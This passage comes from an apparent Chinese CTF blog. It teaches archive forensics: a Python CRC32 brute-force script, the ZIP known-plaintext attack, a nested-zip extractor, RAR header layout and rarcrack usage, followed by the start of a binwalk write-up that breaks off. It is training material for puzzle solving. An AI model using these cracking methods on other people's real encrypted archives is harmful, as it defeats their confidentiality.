class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">dic = string.printable</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackCrc</span>(<span class=\"params\">crc, f</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                s = i+j+p <span class=\"comment\"># 3bytesCRC32碰撞</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class=\"line\">                    f.write(s+<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackZip</span>(<span class=\"params\">f</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">36</span>):</span><br><span class=\"line\">        file = <span class=\"string\">&#x27;flag&#x27;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.zip&#x27;</span></span><br><span class=\"line\">        f = zipfile.ZipFile(file, <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"comment\"># 文件名</span></span><br><span class=\"line\">        GetCrc = f.getinfo(<span class=\"string\">&#x27;flag.txt&#x27;</span>)</span><br><span class=\"line\">        crc = GetCrc.CRC <span class=\"comment\"># 提取文件CRC值</span></span><br><span class=\"line\">        CrackCrc(crc, f)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;out.txt&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f_:</span><br><span class=\"line\">    CrackZip(f_)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"明文攻击\"><a href=\"#明文攻击\" class=\"headerlink\" title=\"明文攻击\"></a>明文攻击</h4><p>明文攻击类似于<code>CRC32破解</code>，但是明文攻击针对的是较大的文件（至少不能CRC32碰撞），并且已知其中一个文件的真实内容。明文攻击是一种较为高效的攻击手段，当我们为ZIP压缩文件设定密码时，先被转换成了3个4字节key，再使用这3个key加密所有文件。当能拿到加密压缩包的一个文件时，以同样的方式压缩（选择相同的压缩算法，确保压缩后明文文件的CRC32与加密文件中的一致），此时两个压缩包中明文压缩后的大小会相差12字节，使用APCHPR进行对比筛选后，就可以获得key，继而解压加密压缩包。</p>\n<ul>\n<li> 一个加密的压缩文件</li>\n<li>知道压缩文件的压缩工具，比如 <code>2345</code> 好压， <code>WinRAR</code> ， <code>7z</code>，<code>zip</code> 等，可以通过文件属性了解。如果是 <code>Linux</code> 平台，用 <code>zipinfo -v</code> 可以查看一个 <code>zip</code> 包的详细信息，包括加密算法等</li>\n<li>知道压缩包里某个文件的部分连续内容 (至少 <code>12</code> 字节)</li>\n</ul>\n<p>如果你已经知道加密文件的部分内容，比如在某个网站上发现了它的 <code>readme.txt</code> 文件，你就可以开始尝试破解了。</p>\n<p>首先，将这个明文文件打包成与加密文件相同格式的包，比如将 <code>readme.txt</code> 打包成 <code>readme.zip</code> ，并且尽量用相同的软件（其实影响不大）。</p>\n<p>打包完成后，需要确认二者采用的压缩算法相同。一个简单的判断方法是用 <code>WinRAR</code> 打开文件，同一个文件压缩后的体积是否相同。如果相同，基本可以说明你用的压缩算法是正确的。如果不同，就尝试另一种压缩算法。</p>\n<p>然后使用<code>ARCHPR</code>或者<code>PKCrack</code>来进行明文破解</p>\n<p><del><em>我个人还是喜欢用<code>ARCHPR</code></em></del></p>\n<h5 id=\"例题-2\"><a href=\"#例题-2\" class=\"headerlink\" title=\"例题\"></a>例题</h5><p><a href=\"https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB\">[ACTF新生赛2020]明文攻击</a></p>\n<p>题目附件打开，提取出两个压缩包，其中一个带有加密，并且其中存放着flag，对比两个压缩包的文件信息：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919111018804.png\" alt=\"image-20210919111018804\"></p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919111028357.png\" alt=\"image-20210919111028357\"></p>\n<p>可以发现未加密的压缩包中的<code>flag.txt</code>文件的CRC32值与加密的压缩包中的相同，并且两个压缩包的格式相同，于是想到进行明文攻击：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919111255564.png\" alt=\"image-20210919111255564\"></p>\n<p>耐心等待执行完成，便可以得到其中的加密文件。</p>\n<h4 id=\"压缩包嵌套\"><a href=\"#压缩包嵌套\" class=\"headerlink\" title=\"压缩包嵌套\"></a>压缩包嵌套</h4><p>这个就简单了，就是一个压缩包里面塞着另外一个压缩包，和俄罗斯套娃一样。可以手动解压，也可以用脚本。</p>\n<h5 id=\"例题-3\"><a href=\"#例题-3\" class=\"headerlink\" title=\"例题\"></a>例题</h5><p><a href=\"https://buuoj.cn/challenges#[MRCTF2020]%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF\">[MRCTF2020]千层套路</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\">name = <span class=\"string\">&#x27;0573&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    fz = zipfile.ZipFile(name + <span class=\"string\">&#x27;.zip&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">    fz.extractall(pwd=<span class=\"built_in\">bytes</span>(name, <span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">    name = fz.filelist[<span class=\"number\">0</span>].filename[<span class=\"number\">0</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">    fz.close()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"RAR文件\"><a href=\"#RAR文件\" class=\"headerlink\" title=\"RAR文件\"></a>RAR文件</h2><p>RAR 是一种专有的文件格式，用于文件的压缩、归档与打包。RAR 的全名是：Roshal Archive（即“罗谢尔的归档”之意），其开发者是尤金·罗谢尔（Eugene Roshal）。Eugene Roshal后来公开了解码程序的源代码，但是编码程序仍然是私有的。RAR 因为其独特的压缩算法，基本可以做到无损压缩，而且还能够满足较高的压缩比，同时保证一定的压缩速度。RAR 拥有成熟的加密算法，2.0 版本以后使用 AES 算法来加密，AES 算法的破解难度比较大，在没有密码的情况下只能采取暴力破解的办法，对于数据的安全性有一定的保证。</p>\n<h3 id=\"rar文件结构\"><a href=\"#rar文件结构\" class=\"headerlink\" title=\"rar文件结构\"></a>rar文件结构</h3><p>以常用的WinRAR制作，老版格式不予介绍。</p>\n<p><del><em>这本来就是商业机密好吧</em></del></p>\n<h4 id=\"Rar\"><a href=\"#Rar\" class=\"headerlink\" title=\"Rar!\"></a>Rar!</h4><p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210920161339563.png\" alt=\"image-20210920161339563\"></p>\n<table>\n<thead>\n<tr>\n<th>HEX数据</th>\n<th>描述</th>\n<th>010Editor模板数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>52 61 72 21 1A 07 00</td>\n<td>rar文件头标记，文本为Rar!</td>\n<td></td>\n</tr>\n</tbody></table>\n<h4 id=\"Main-block\"><a href=\"#Main-block\" class=\"headerlink\" title=\"Main block\"></a>Main block</h4><table>\n<thead>\n<tr>\n<th>HEX数据</th>\n<th>描述</th>\n<th>010Editor模板数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>33 92 B5 E5</td>\n<td>全部块的CRC32值</td>\n<td>uint32 HEAD_CRC</td>\n</tr>\n<tr>\n<td>0A</td>\n<td>块大小</td>\n<td>struct uleb128 HeadSize</td>\n</tr>\n<tr>\n<td>01</td>\n<td>块类型</td>\n<td>struct uleb128 HeadType</td>\n</tr>\n<tr>\n<td>05</td>\n<td>阻止标志</td>\n<td>struct uleb128 HeadFlag</td>\n</tr>\n</tbody></table>\n<h4 id=\"File-Header\"><a href=\"#File-Header\" class=\"headerlink\" title=\"File Header\"></a>File Header</h4><table>\n<thead>\n<tr>\n<th>HEX数据</th>\n<th>描述</th>\n<th>010Editor模板数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>43 06 35 17</td>\n<td>单独块的CRC32值</td>\n<td>uint32 HEAD_CRC</td>\n</tr>\n<tr>\n<td>55</td>\n<td>块大小</td>\n<td>struct uleb128 HeadSize</td>\n</tr>\n<tr>\n<td>02</td>\n<td>块类型</td>\n<td>struct uleb128 HeadType</td>\n</tr>\n<tr>\n<td>03</td>\n<td>阻止标志</td>\n<td>struct uleb128 HeadFlag</td>\n</tr>\n</tbody></table>\n<h4 id=\"Terminator\"><a href=\"#Terminator\" class=\"headerlink\" title=\"Terminator\"></a>Terminator</h4><table>\n<thead>\n<tr>\n<th>HEX数据</th>\n<th>描述</th>\n<th>010Editor模板数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1D 77 56 51</td>\n<td>固定的CRC32值</td>\n<td>uint32 HEAD_CRC</td>\n</tr>\n<tr>\n<td>03</td>\n<td>块大小</td>\n<td>struct uleb128 HeadSize</td>\n</tr>\n<tr>\n<td>05</td>\n<td>块类型</td>\n<td>struct uleb128 HeadType</td>\n</tr>\n<tr>\n<td>04 00</td>\n<td>阻止标志</td>\n<td>struct uleb128 HeadFlag</td>\n</tr>\n</tbody></table>\n<h3 id=\"rar文件常见考点\"><a href=\"#rar文件常见考点\" class=\"headerlink\" title=\"rar文件常见考点\"></a>rar文件常见考点</h3><h4 id=\"爆破-1\"><a href=\"#爆破-1\" class=\"headerlink\" title=\"爆破\"></a>爆破</h4><p>这个与zip相同，要么使用<code>ARCHPR</code>（个人推荐），或者使用<code>RarCrack</code>：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~$ rarcrack --help</span><br><span class=\"line\">RarCrack! 0.2 by David Zoltan Kedves (kedazo@gmail.com)</span><br><span class=\"line\"></span><br><span class=\"line\">Usage:   rarcrack encrypted_archive.ext [--threads NUM] [--type rar|zip|7z]</span><br><span class=\"line\"></span><br><span class=\"line\">Options: --help: show this screen.</span><br><span class=\"line\">         --type: you can specify the archive program, this needed when</span><br><span class=\"line\">                 the program couldn&#x27;t detect the proper file type</span><br><span class=\"line\">         --threads: you can specify how many threads</span><br><span class=\"line\">                    will be run, maximum 12 (default: 2)</span><br><span class=\"line\"></span><br><span class=\"line\">Info:    This program supports only RAR, ZIP and 7Z encrypted archives.</span><br><span class=\"line\">         RarCrack! usually detects the archive type.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"rar伪加密\"><a href=\"#rar伪加密\" class=\"headerlink\" title=\"rar伪加密\"></a>rar伪加密</h4><p>使用<code>010 Editor</code>运行模板查看加密的rar文件信息，可以在每个文件的文件块里面看到加密状态：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210920163100855.png\" alt=\"image-20210920163100855\"></p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/6.png\" alt=\"img\"></p>\n<p>手动修改为0即可</p>\n","categories":["Basic","Misc"]},{"title":"真的很杂","url":"/2021/09/14/%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/","content":"<p><a href=\"https://buuoj.cn/challenges#%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82\">题目链接</a><br>附件下载解压，得到一张jpg文件：<br>![](/images/Writeup/20210914104906.png]<br>看了一下分辨率，文件大得离谱，于是尝试使用[[Binwalk]分析隐写文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ binwalk -e 真的很杂.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class=\"line\">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class=\"line\">5176          0x1438          Zip archive data, at least v2.0 to extract, name: res/anim/abc_fade_in.xml</span><br><span class=\"line\">5469          0x155D          Zip archive data, at least v2.0 to extract, name: res/anim/abc_fade_out.xml</span><br><span class=\"line\">5760          0x1680          Zip archive data, at least v2.0 to extract, name: res/anim/abc_slide_in_bottom.xml</span><br><span class=\"line\">6064          0x17B0          Zip archive data, at least v2.0 to extract, name: res/anim/abc_slide_in_top.xml</span><br><span class=\"line\">6365          0x18DD          Zip archive data, at least v2.0 to extract, name: res/anim/abc_slide_out_bottom.xml</span><br><span class=\"line\">6669          0x1A0D          Zip archive data, at least v2.0 to extract, name: res/anim/abc_slide_out_top.xml</span><br><span class=\"line\">6971          0x1B3B          Zip archive data, at least v2.0 to extract, name: res/color/abc_search_url_text_holo.xml</span><br><span class=\"line\">7309          0x1C8D          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_ic_clear.xml</span><br><span class=\"line\">7635          0x1DD3          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_ic_clear_holo_light.xml</span><br><span class=\"line\">7972          0x1F24          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_item_background_holo_dark.xml</span><br><span class=\"line\">8401          0x20D1          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_item_background_holo_light.xml</span><br><span class=\"line\">8831          0x227F          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_list_selector_background_transition_holo_dark.xml</span><br><span class=\"line\">9160          0x23C8          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_list_selector_background_transition_holo_light.xml</span><br><span class=\"line\">9490          0x2512          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_list_selector_holo_dark.xml</span><br><span class=\"line\">9939          0x26D3          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_list_selector_holo_light.xml</span><br><span class=\"line\">10390         0x2896          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_search_dropdown_dark.xml</span><br><span class=\"line\">10837         0x2A55          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_search_dropdown_light.xml</span><br><span class=\"line\">11283         0x2C13          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_spinner_ab_holo_dark.xml</span><br><span class=\"line\">11679         0x2D9F          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_spinner_ab_holo_light.xml</span><br><span class=\"line\">12076         0x2F2C          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_tab_indicator_ab_holo.xml</span><br><span class=\"line\">12523         0x30EB          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_textfield_searchview_holo_dark.xml</span><br><span class=\"line\">12874         0x324A          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_textfield_searchview_holo_light.xml</span><br><span class=\"line\">13225         0x33A9          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_textfield_searchview_right_holo_dark.xml</span><br><span class=\"line\">13581         0x350D          Zip archive data, at least v2.0 to extract, name: res/drawable/abc_textfield_searchview_right_holo_light.xml</span><br><span class=\"line\">13939         0x3673          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_decor.xml</span><br><span class=\"line\">14326         0x37F6          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_decor_include.xml</span><br><span class=\"line\">14983         0x3A87          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_decor_overlay.xml</span><br><span class=\"line\">15741         0x3D7D          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_home.xml</span><br><span class=\"line\">16343         0x3FD7          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_tab.xml</span><br><span class=\"line\">16733         0x415D          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_tabbar.xml</span><br><span class=\"line\">17097         0x42C9          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_title_item.xml</span><br><span class=\"line\">17725         0x453D          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_bar_view_list_nav_layout.xml</span><br><span class=\"line\">18057         0x4689          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_menu_item_layout.xml</span><br><span class=\"line\">18579         0x4893          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_menu_layout.xml</span><br><span class=\"line\">18977         0x4A21          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_mode_bar.xml</span><br><span class=\"line\">19340         0x4B8C          Zip archive data, at least v2.0 to extract, name: res/layout/abc_action_mode_close_item.xml</span><br><span class=\"line\">19900         0x4DBC          Zip archive data, at least v2.0 to extract, name: res/layout/abc_activity_chooser_view.xml</span><br><span class=\"line\">20360         0x4F88          Zip archive data, at least v2.0 to extract, name: res/layout/abc_activity_chooser_view_include.xml</span><br><span class=\"line\">20976         0x51F0          Zip archive data, at least v2.0 to extract, name: res/layout/abc_activity_chooser_view_list_item.xml</span><br><span class=\"line\">21621         0x5475          Zip archive data, at least v2.0 to extract, name: res/layout/abc_expanded_menu_layout.xml</span><br><span class=\"line\">21949         0x55BD          Zip archive data, at least v2.0 to extract, name: res/layout/abc_list_menu_item_checkbox.xml</span><br><span class=\"line\">22330         0x573A          Zip archive data, at least v2.0 to extract, name: res/layout/abc_list_menu_item_icon.xml</span><br><span class=\"line\">22772         0x58F4          Zip archive data, at least v2.0 to extract, name: res/layout/abc_list_menu_item_layout.xml</span><br><span class=\"line\">23443         0x5B93          Zip archive data, at least v2.0 to extract, name: res/layout/abc_list_menu_item_radio.xml</span><br><span class=\"line\">23822         0x5D0E          Zip archive data, at least v2.0 to extract, name: res/layout/abc_popup_menu_item_layout.xml</span><br><span class=\"line\">24529         0x5FD1          Zip archive data, at least v2.0 to extract, name: res/layout/abc_search_dropdown_item_icons_2line.xml</span><br><span class=\"line\">25439         0x635F          Zip archive data, at least v2.0 to extract, name: res/layout/abc_search_view.xml</span><br><span class=\"line\">26733         0x686D          Zip archive data, at least v2.0 to extract, name: res/layout/activity_main.xml</span><br><span class=\"line\">27242         0x6A6A          Zip archive data, at least v2.0 to extract, name: res/layout/fragment_main.xml</span><br><span class=\"line\">27582         0x6BBE          Zip archive data, at least v2.0 to extract, name: res/layout/support_simple_spinner_dropdown_item.xml</span><br><span class=\"line\">27983         0x6D4F          Zip archive data, at least v2.0 to extract, name: res/menu/main.xml</span><br><span class=\"line\">28327         0x6EA7          Zip archive data, at least v2.0 to extract, name: AndroidManifest.xml</span><br><span class=\"line\">29035         0x716B          Zip archive data, at least v1.0 to extract, compressed size: 94568, uncompressed size: 94568, name: resources.arsc</span><br><span class=\"line\">123647        0x1E2FF         Zip archive data, at least v2.0 to extract, name: res/layout-v11/abc_action_bar_decor.xml</span><br><span class=\"line\">124096        0x1E4C0         Zip archive data, at least v2.0 to extract, name: res/layout-v14/abc_activity_chooser_view.xml</span><br><span class=\"line\">124529        0x1E671         Zip archive data, at least v1.0 to extract, compressed size: 213, uncompressed size: 213, name: res/drawable-hdpi/abc_ab_bottom_solid_dark_holo.9.png</span><br><span class=\"line\">124825        0x1E799         Zip archive data, at least v1.0 to extract, compressed size: 212, uncompressed size: 212, name: res/drawable-hdpi/abc_ab_bottom_solid_light_holo.9.png</span><br><span class=\"line\">125121        0x1E8C1         Zip archive data, at least v1.0 to extract, compressed size: 224, uncompressed size: 224, name: res/drawable-hdpi/abc_ab_bottom_transparent_dark_holo.9.png</span><br><span class=\"line\">125434        0x1E9FA         Zip archive data, at least v1.0 to extract, compressed size: 224, uncompressed size: 224, name: res/drawable-hdpi/abc_ab_bottom_transparent_light_holo.9.png</span><br><span class=\"line\">125748        0x1EB34         Zip archive data, at least v1.0 to extract, compressed size: 267, uncompressed size: 267, name: res/drawable-hdpi/abc_ab_share_pack_holo_dark.9.png</span><br><span class=\"line\">126096        0x1EC90         Zip archive data, at least v1.0 to extract, compressed size: 268, uncompressed size: 268, name: res/drawable-hdpi/abc_ab_share_pack_holo_light.9.png</span><br><span class=\"line\">126446        0x1EDEE         Zip archive data, at least v1.0 to extract, compressed size: 219, uncompressed size: 219, name: res/drawable-hdpi/abc_ab_solid_dark_holo.9.png</span><br><span class=\"line\">126741        0x1EF15         Zip archive data, at least v1.0 to extract, compressed size: 218, uncompressed size: 218, name: res/drawable-hdpi/abc_ab_solid_light_holo.9.png</span><br><span class=\"line\">127036        0x1F03C         Zip archive data, at least v1.0 to extract, compressed size: 219, uncompressed size: 219, name: res/drawable-hdpi/abc_ab_stacked_solid_dark_holo.9.png</span><br><span class=\"line\">127339        0x1F16B         Zip archive data, at least v1.0 to extract, compressed size: 219, uncompressed size: 219, name: res/drawable-hdpi/abc_ab_stacked_solid_light_holo.9.png</span><br><span class=\"line\">127643        0x1F29B         Zip archive data, at least v1.0 to extract, compressed size: 214, uncompressed size: 214, name: res/drawable-hdpi/abc_ab_stacked_transparent_dark_holo.9.png</span><br><span class=\"line\">127947        0x1F3CB         Zip archive data, at least v1.0 to extract, compressed size: 212, uncompressed size: 212, name: res/drawable-hdpi/abc_ab_stacked_transparent_light_holo.9.png</span><br><span class=\"line\">128250        0x1F4FA         Zip archive data, at least v1.0 to extract, compressed size: 242, uncompressed size: 242, name: res/drawable-hdpi/abc_ab_transparent_dark_holo.9.png</span><br><span class=\"line\">128574        0x1F63E         Zip archive data, at least v1.0 to extract, compressed size: 241, uncompressed size: 241, name: res/drawable-hdpi/abc_ab_transparent_light_holo.9.png</span><br><span class=\"line\">128898        0x1F782         Zip archive data, at least v1.0 to extract, compressed size: 216, uncompressed size: 216, name: res/drawable-hdpi/abc_cab_background_bottom_holo_dark.9.png</span><br><span class=\"line\">129203        0x1F8B3         Zip archive data, at least v1.0 to extract, compressed size: 214, uncompressed size: 214, name: res/drawable-hdpi/abc_cab_background_bottom_holo_light.9.png</span><br><span class=\"line\">129507        0x1F9E3         Zip archive data, at least v1.0 to extract, compressed size: 217, uncompressed size: 217, name: res/drawable-hdpi/abc_cab_background_top_holo_dark.9.png</span><br><span class=\"line\">129810        0x1FB12         Zip archive data, at least v1.0 to extract, compressed size: 214, uncompressed size: 214, name: res/drawable-hdpi/abc_cab_background_top_holo_light.9.png</span><br><span class=\"line\">130111        0x1FC3F         Zip archive data, at least v1.0 to extract, compressed size: 548, uncompressed size: 548, name: res/drawable-hdpi/abc_ic_ab_back_holo_dark.png</span><br><span class=\"line\">130735        0x1FEAF         Zip archive data, at least v1.0 to extract, compressed size: 438, uncompressed size: 438, name: res/drawable-hdpi/abc_ic_ab_back_holo_light.png</span><br><span class=\"line\">131250        0x200B2         Zip archive data, at least v1.0 to extract, compressed size: 791, uncompressed size: 791, name: res/drawable-hdpi/abc_ic_cab_done_holo_dark.png</span><br><span class=\"line\">132118        0x20416         Zip archive data, at least v1.0 to extract, compressed size: 605, uncompressed size: 605, name: res/drawable-hdpi/abc_ic_cab_done_holo_light.png</span><br><span class=\"line\">132801        0x206C1         Zip archive data, at least v1.0 to extract, compressed size: 996, uncompressed size: 996, name: res/drawable-hdpi/abc_ic_clear_disabled.png</span><br><span class=\"line\">133870        0x20AEE         Zip archive data, at least v1.0 to extract, compressed size: 1498, uncompressed size: 1498, name: res/drawable-hdpi/abc_ic_clear_normal.png</span><br><span class=\"line\">135439        0x2110F         Zip archive data, at least v1.0 to extract, compressed size: 409, uncompressed size: 409, name: res/drawable-hdpi/abc_ic_clear_search_api_disabled_holo_light.png</span><br><span class=\"line\">135943        0x21307         Zip archive data, at least v1.0 to extract, compressed size: 451, uncompressed size: 451, name: res/drawable-hdpi/abc_ic_clear_search_api_holo_light.png</span><br><span class=\"line\">136480        0x21520         Zip archive data, at least v1.0 to extract, compressed size: 493, uncompressed size: 493, name: res/drawable-hdpi/abc_ic_commit_search_api_holo_dark.png</span><br><span class=\"line\">137059        0x21763         Zip archive data, at least v1.0 to extract, compressed size: 448, uncompressed size: 448, name: res/drawable-hdpi/abc_ic_commit_search_api_holo_light.png</span><br><span class=\"line\">137594        0x2197A         Zip archive data, at least v1.0 to extract, compressed size: 815, uncompressed size: 815, name: res/drawable-hdpi/abc_ic_go.png</span><br><span class=\"line\">138470        0x21CE6         Zip archive data, at least v1.0 to extract, compressed size: 254, uncompressed size: 254, name: res/drawable-hdpi/abc_ic_go_search_api_holo_light.png</span><br><span class=\"line\">138807        0x21E37         Zip archive data, at least v1.0 to extract, compressed size: 126, uncompressed size: 126, name: res/drawable-hdpi/abc_ic_menu_moreoverflow_normal_holo_dark.png</span><br><span class=\"line\">139026        0x21F12         Zip archive data, at least v1.0 to extract, compressed size: 136, uncompressed size: 136, name: res/drawable-hdpi/abc_ic_menu_moreoverflow_normal_holo_light.png</span><br><span class=\"line\">139256        0x21FF8         Zip archive data, at least v1.0 to extract, compressed size: 578, uncompressed size: 578, name: res/drawable-hdpi/abc_ic_menu_share_holo_dark.png</span><br><span class=\"line\">139913        0x22289         Zip archive data, at least v1.0 to extract, compressed size: 607, uncompressed size: 607, name: res/drawable-hdpi/abc_ic_menu_share_holo_light.png</span><br><span class=\"line\">140600        0x22538         Zip archive data, at least v1.0 to extract, compressed size: 1688, uncompressed size: 1688, name: res/drawable-hdpi/abc_ic_search.png</span><br><span class=\"line\">142353        0x22C11         Zip archive data, at least v1.0 to extract, compressed size: 973, uncompressed size: 973, name: res/drawable-hdpi/abc_ic_search_api_holo_light.png</span><br><span class=\"line\">143406        0x2302E         Zip archive data, at least v1.0 to extract, compressed size: 2013, uncompressed size: 2013, name: res/drawable-hdpi/abc_ic_voice_search.png</span><br><span class=\"line\">145490        0x23852         Zip archive data, at least v1.0 to extract, compressed size: 705, uncompressed size: 705, name: res/drawable-hdpi/abc_ic_voice_search_api_holo_light.png</span><br><span class=\"line\">146281        0x23B69         Zip archive data, at least v1.0 to extract, compressed size: 132, uncompressed size: 132, name: res/drawable-hdpi/abc_list_divider_holo_dark.9.png</span><br><span class=\"line\">146493        0x23C3D         Zip archive data, at least v1.0 to extract, compressed size: 132, uncompressed size: 132, name: res/drawable-hdpi/abc_list_divider_holo_light.9.png</span><br><span class=\"line\">146706        0x23D12         Zip archive data, at least v1.0 to extract, compressed size: 208, uncompressed size: 208, name: res/drawable-hdpi/abc_list_focused_holo.9.png</span><br><span class=\"line\">146989        0x23E2D         Zip archive data, at least v1.0 to extract, compressed size: 176, uncompressed size: 176, name: res/drawable-hdpi/abc_list_longpressed_holo.9.png</span><br><span class=\"line\">147244        0x23F2C         Zip archive data, at least v1.0 to extract, compressed size: 176, uncompressed size: 176, name: res/drawable-hdpi/abc_list_pressed_holo_dark.9.png</span><br><span class=\"line\">147500        0x2402C         Zip archive data, at least v1.0 to extract, compressed size: 176, uncompressed size: 176, name: res/drawable-hdpi/abc_list_pressed_holo_light.9.png</span><br><span class=\"line\">147757        0x2412D         Zip archive data, at least v1.0 to extract, compressed size: 203, uncompressed size: 203, name: res/drawable-hdpi/abc_list_selector_disabled_holo_dark.9.png</span><br><span class=\"line\">148050        0x24252         Zip archive data, at least v1.0 to extract, compressed size: 204, uncompressed size: 204, name: res/drawable-hdpi/abc_list_selector_disabled_holo_light.9.png</span><br><span class=\"line\">148345        0x24379         Zip archive data, at least v1.0 to extract, compressed size: 1226, uncompressed size: 1226, name: res/drawable-hdpi/abc_menu_dropdown_panel_holo_dark.9.png</span><br><span class=\"line\">149658        0x2489A         Zip archive data, at least v1.0 to extract, compressed size: 1249, uncompressed size: 1249, name: res/drawable-hdpi/abc_menu_dropdown_panel_holo_light.9.png</span><br><span class=\"line\">150995        0x24DD3         Zip archive data, at least v1.0 to extract, compressed size: 842, uncompressed size: 842, name: res/drawable-hdpi/abc_menu_hardkey_panel_holo_dark.9.png</span><br><span class=\"line\">151923        0x25173         Zip archive data, at least v1.0 to extract, compressed size: 817, uncompressed size: 817, name: res/drawable-hdpi/abc_menu_hardkey_panel_holo_light.9.png</span><br><span class=\"line\">152827        0x254FB         Zip archive data, at least v1.0 to extract, compressed size: 333, uncompressed size: 333, name: res/drawable-hdpi/abc_spinner_ab_default_holo_dark.9.png</span><br><span class=\"line\">153246        0x2569E         Zip archive data, at least v1.0 to extract, compressed size: 334, uncompressed size: 334, name: res/drawable-hdpi/abc_spinner_ab_default_holo_light.9.png</span><br><span class=\"line\">153667        0x25843         Zip archive data, at least v1.0 to extract, compressed size: 333, uncompressed size: 333, name: res/drawable-hdpi/abc_spinner_ab_disabled_holo_dark.9.png</span><br><span class=\"line\">154087        0x259E7         Zip archive data, at least v1.0 to extract, compressed size: 333, uncompressed size: 333, name: res/drawable-hdpi/abc_spinner_ab_disabled_holo_light.9.png</span><br><span class=\"line\">154508        0x25B8C         Zip archive data, at least v1.0 to extract, compressed size: 515, uncompressed size: 515, name: 